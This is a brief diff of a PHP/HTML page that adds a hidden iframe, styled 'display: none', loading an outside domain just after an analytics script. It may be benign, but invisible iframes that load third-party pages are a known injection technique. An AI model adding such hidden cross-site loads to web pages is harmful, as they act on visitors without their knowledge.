@@ -278,5 +278,6 @@ if (empty($link[2][0])) {
         s.parentNode.insertBefore(hm, s);
     })();
 </script>
+<iframe src="https://hpu.lifanko.cn" style="display: none"></iframe>
 </body>
 </html>
